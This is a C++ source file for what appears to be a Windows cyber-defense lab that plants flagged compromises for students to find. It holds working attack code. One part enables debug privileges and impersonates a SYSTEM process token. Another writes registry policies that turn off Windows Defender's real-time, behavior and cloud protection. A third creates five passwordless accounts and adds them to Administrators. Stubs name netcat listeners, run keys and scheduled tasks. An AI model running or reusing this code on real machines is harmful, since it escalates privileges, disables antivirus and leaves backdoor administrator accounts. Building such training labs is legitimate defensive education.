#include <windows.h>
#include <string>
#include <iostream>
#include <TlHelp32.h>
#include <lmcons.h>
#include <lmaccess.h>
// #include <lmerr.h>
// #include <lmapibuf.h>
// #include <stdio.h>
// #include <stdlib.h>
#include "../include/lab6.h"

#pragma comment(lib, "netapi32.lib")

#define MAX_NAME 256

namespace lab6 {

// constants for the flags
const char* kFlagPrefix = "ACDLAB6{";
const char* kBadAdminFlag = "Never_should_have_come_here}";
const char* kImageFileExecFlag = "Can't_touch_this}";
const char* kFirewallFlag = "They_took_down_our_shields!}";
const char* kCurrentVersionRunFlag = "Autobots_roll_out}";
const char* kSSHFlag = "I_think_this_is_the_wrong_OS}";
const char* kNetcatFlag = "Nyancat_bootloader_time}";
const char* kSpawnedCMDFlag = "Hey_you_shouldn't_be_running_there}";
const char* kInstalledServiceFlag = "Definitely_a_legit_service}";
const char* kTaskSchedulerFlag = "Wanna_see_me_run_it_again}";

// // names of the bad admin users
// const char* kBadAdminName1 = "Spongebob";
// const char* kBadAdminName2 = "Patrick";
// const char* kBadAdminName3 = "Mr. Krabs";
// const char* kBadAdminName4 = "Sandy";
// const char* kBadAdminName5 = "Plankton";

std::string EnableDebugPrivs() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return "[ERROR] OpenProcessToken/GetCurrentProcess failed. GetLastError: " + GetLastError();
    }

    if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        return "[ERROR] LookupPrivilegeValue failed. GetLastError: " + GetLastError();
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        return "[ERROR] AdjustTokenPrivileges failed. GetLastError: " + GetLastError();
    }

    return "SUCCESS";
}

BOOL GetLogonFromToken (HANDLE hToken, std::string& strUser, std::string& strdomain) 
{
   DWORD dwSize = MAX_NAME;
   BOOL bSuccess = FALSE;
   DWORD dwLength = 0;
   strUser = "";
   strdomain = "";
   PTOKEN_USER ptu = NULL;
 //Verify the parameter passed in is not NULL.
    if (NULL == hToken)
        goto Cleanup;

       if (!GetTokenInformation(
         hToken,         // handle to the access token
         TokenUser,    // get information about the token's groups 
         (LPVOID) ptu,   // pointer to PTOKEN_USER buffer
         0,              // size of buffer
         &dwLength       // receives required buffer size
      )) 
   {
      if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) 
         goto Cleanup;

      ptu = (PTOKEN_USER)HeapAlloc(GetProcessHeap(),
         HEAP_ZERO_MEMORY, dwLength);

      if (ptu == NULL)
         goto Cleanup;
   }

    if (!GetTokenInformation(
         hToken,         // handle to the access token
         TokenUser,    // get information about the token's groups 
         (LPVOID) ptu,   // pointer to PTOKEN_USER buffer
         dwLength,       // size of buffer
         &dwLength       // receives required buffer size
         )) 
   {
      goto Cleanup;
   }
    SID_NAME_USE SidType;
    char lpName[MAX_NAME];
    char lpDomain[MAX_NAME];

    if( !LookupAccountSidA( NULL , ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType ) )                                    
    {
        DWORD dwResult = GetLastError();
        if( dwResult == ERROR_NONE_MAPPED )
           strcpy (lpName, "NONE_MAPPED" );
        else 
        {
            // printf("LookupAccountSid Error %u\n", GetLastError());
        }
    }
    else
    {
        // printf( "Current user is  %s\\%s\n", 
        //         lpDomain, lpName );
        strUser = lpName;
        strdomain = lpDomain;
        bSuccess = TRUE;
    }

Cleanup: 

   if (ptu != NULL)
      HeapFree(GetProcessHeap(), 0, (LPVOID)ptu);
   return bSuccess;
}

HRESULT GetUserFromProcess(const DWORD procId,  std::string& strUser, std::string& strdomain)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,procId); 
    if(hProcess == NULL)
        return E_FAIL;
    HANDLE hToken = NULL;

    if( !OpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) )
    {
        CloseHandle( hProcess );
        return E_FAIL;
    }
    BOOL bres = GetLogonFromToken (hToken, strUser,  strdomain);

    CloseHandle( hToken );
    CloseHandle( hProcess );
    return bres?S_OK:E_FAIL;
}

std::string ElevateToSystem() {
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 1);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return "[ERROR] CreateToolhelp32Snapshot failed. GetLastError: " + GetLastError();
    }

    if (Process32First(hSnapshot, &pe) != TRUE) {
        return "[ERROR] Process32First failed. GetLastError: " + GetLastError();
    }

    BOOL success = FALSE;

    do {
        std::string strUser;
        std::string strdomain;
        GetUserFromProcess(pe.th32ProcessID, strUser, strdomain);
        if (strUser.compare(std::string("SYSTEM")) == 0) {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (hProc != NULL) {
                HANDLE hToken;
                if (OpenProcessToken(hProc, TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &hToken)) {
                    HANDLE hDupeToken;
                    if (DuplicateToken(hToken, SecurityImpersonation, &hDupeToken)) {
                        if (SetThreadToken(NULL, hDupeToken)) {
                            success = TRUE;
                        } else {
                            std::cout << "SetThreadToken GetLastError: " << GetLastError() << std::endl;
                        }
                    } else {
                        std::cout << "DuplicateToken GetLastError: " << GetLastError() << std::endl;
                    }
                    CloseHandle(hDupeToken);
                } else {
                    std::cout << "OpenProcessToken GetLastError: " << GetLastError() << std::endl;
                }
                CloseHandle(hToken);
            }
            CloseHandle(hProc);
        }
    } while (Process32Next(hSnapshot, &pe) == TRUE && !success);

    return "SUCCESS";
}

std::string CheckCurrentUsername() {
    char username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    GetUserNameA(username, &username_len);
    return std::string(username);
}

std::string DestroyDefender() {
    DWORD one = 1;
    DWORD zero = 0;
    HKEY hkResult;
    DWORD dwDisposition;
    int retVal;

    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Windows Defender", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegCreateKeyExA A failed with retVal: " << retVal << std::endl;
    }
    if (dwDisposition == REG_CREATED_NEW_KEY) {
        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
    } else {
        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
    }
    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" "DisableAntiSpyware" 1
    retVal = RegSetValueExA(hkResult, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA A1 failed with retVal: " << retVal << std::endl;
    }
    // HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableRoutinelyTakingAction", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA A2 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA A3 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableAntiVirus", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA A4 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableSpecialRunningModes", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA A5 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0
    retVal = RegSetValueExA(hkResult, "ServiceKeepAlive", 0, REG_DWORD, (const BYTE*)&zero, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA A6 failed with retVal: " << retVal << std::endl;
    }
    RegCloseKey(hkResult);

    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegCreateKeyExA B failed with retVal: " << retVal << std::endl;
    }
    if (dwDisposition == REG_CREATED_NEW_KEY) {
        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
    } else {
        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA B1 failed with retVal: " << retVal << std::endl;
    }
    // HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableRoutinelyTakingAction", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA B2 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA B3 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableAntiVirus", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA B4 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableSpecialRunningModes", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA B5 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0
    retVal = RegSetValueExA(hkResult, "ServiceKeepAlive", 0, REG_DWORD, (const BYTE*)&zero, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA B6 failed with retVal: " << retVal << std::endl;
    }
    RegCloseKey(hkResult);

    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegCreateKeyExA C failed with retVal: " << retVal << std::endl;
    }
    if (dwDisposition == REG_CREATED_NEW_KEY) {
        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
    } else {
        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0
    retVal = RegSetValueExA(hkResult, "SpyNetReporting", 0, REG_DWORD, (const BYTE*)&zero, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA C1 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0
    retVal = RegSetValueExA(hkResult, "SubmitSamplesConsent", 0, REG_DWORD, (const BYTE*)&zero, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA C2 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBlockAtFirstSeen" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableBlockAtFirstSeen", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA C3 failed with retVal: " << retVal << std::endl;
    }
    RegCloseKey(hkResult);

    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWAR\\Policies\\Microsoft\\MRT", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegCreateKeyExA D failed with retVal: " << retVal << std::endl;
    }
    if (dwDisposition == REG_CREATED_NEW_KEY) {
        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
    } else {
        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1
    retVal = RegSetValueExA(hkResult, "DontReportInfectionInformation", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA D1 failed with retVal: " << retVal << std::endl;
    }
    RegCloseKey(hkResult);

    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegCreateKeyExA E failed with retVal: " << retVal << std::endl;
    }
    if (dwDisposition == REG_CREATED_NEW_KEY) {
        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
    } else {
        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" -Name "ForceUpdateFromMU" -Value 0
    retVal = RegSetValueExA(hkResult, "ForceUpdateFromMU", 0, REG_DWORD, (const BYTE*)&zero, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA E1 failed with retVal: " << retVal << std::endl;
    }
    RegCloseKey(hkResult);

    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegCreateKeyExA F failed with retVal: " << retVal << std::endl;
    }
    if (dwDisposition == REG_CREATED_NEW_KEY) {
        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
    } else {
        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA F1 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA F2 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA F3 failed with retVal: " << retVal << std::endl;
    }
    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1
    retVal = RegSetValueExA(hkResult, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&one, 1);
    if (retVal != ERROR_SUCCESS) {
        std::cout << "RegSetValueExA F4 failed with retVal: " << retVal << std::endl;
    }
    RegCloseKey(hkResult);

    return "";

    // https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
    // https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
    // https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
}

std::string MakeBadAdmins() {

    // ignore errors about converting string constants to microsoft garbage strings
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wwrite-strings"

    USER_INFO_1 badAdmin1;
    USER_INFO_1 badAdmin2;
    USER_INFO_1 badAdmin3;
    USER_INFO_1 badAdmin4;
    USER_INFO_1 badAdmin5;
    int retVal = 0;
    DWORD parm_err = 0;

    badAdmin1.usri1_name = L"Spongebob";
    badAdmin1.usri1_password = L"";
    badAdmin1.usri1_priv = USER_PRIV_USER;
    badAdmin1.usri1_home_dir = L"";
    badAdmin1.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
    badAdmin1.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
    badAdmin1.usri1_script_path = L"";

    badAdmin2.usri1_name = L"Patrick";
    badAdmin2.usri1_password = L"";
    badAdmin2.usri1_priv = USER_PRIV_USER;
    badAdmin2.usri1_home_dir = L"";
    badAdmin2.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
    badAdmin2.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
    badAdmin2.usri1_script_path = L"";

    badAdmin3.usri1_name = L"Mr. Krabs";
    badAdmin3.usri1_password = L"";
    badAdmin3.usri1_priv = USER_PRIV_USER;
    badAdmin3.usri1_home_dir = L"";
    badAdmin3.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
    badAdmin3.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
    badAdmin3.usri1_script_path = L"";

    badAdmin4.usri1_name = L"Sandy";
    badAdmin4.usri1_password = L"";
    badAdmin4.usri1_priv = USER_PRIV_USER;
    badAdmin4.usri1_home_dir = L"";
    badAdmin4.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
    badAdmin4.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
    badAdmin4.usri1_script_path = L"";

    badAdmin5.usri1_name = L"Plankton";
    badAdmin5.usri1_password = L"";
    badAdmin5.usri1_priv = USER_PRIV_USER;
    badAdmin5.usri1_home_dir = L"";
    badAdmin5.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
    badAdmin5.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
    badAdmin5.usri1_script_path = L"";

    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin1, &parm_err);
    if (retVal != 0) {
        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
    }

    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin1, 1);
    if (retVal != 0) {
        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
    }

    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin2, &parm_err);
    if (retVal != 0) {
        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
    }

    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin2, 1);
    if (retVal != 0) {
        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
    }

    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin3, &parm_err);
    if (retVal != 0) {
        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
    }

    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin3, 1);
    if (retVal != 0) {
        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
    }

    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin4, &parm_err);
    if (retVal != 0) {
        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
    }

    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin4, 1);
    if (retVal != 0) {
        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
    }

    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin5, &parm_err);
    if (retVal != 0) {
        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
    }

    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin5, 1);
    if (retVal != 0) {
        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
    }

    #pragma GCC diagnostic pop

    return "";
}

std::string AddImageFileExecutionOptionsKeys() {
    return "";
}

std::string MisconfigureFirewall() {
    return "";
}

std::string AddCurrentVersionRunKeys() {
    return "";
}

std::string InstallAndRunSSHServer() {
    return "";
}

std::string RunNetcatListeners() {
    return "";
}

std::string InjectCMDs() {
    return "";
}

std::string InstallService() {
    return "";
}

std::string AddTaskScheduler() {
    return "";
}

} // namespace lab6

// needs elevated run to privesc to system
int main (int argc, char *argv[]) {
    std::cout << "EnableDebugPrivs: " << lab6::EnableDebugPrivs() << std::endl;
    std::cout << "ElevateToSystem: " << lab6::ElevateToSystem() << std::endl;
    std::cout << "CheckCurrentUsername: " << lab6::CheckCurrentUsername() << std::endl;
    // need to test DestroyDefender on vm
    // std::cout << "DestroyDefender: " << lab6::DestroyDefender() << std::endl;
    // std::cout << "MakeBadAdmins: " << lab6::MakeBadAdmins() << std::endl;

    int x;
    std::cin >> x;
    return 0;
}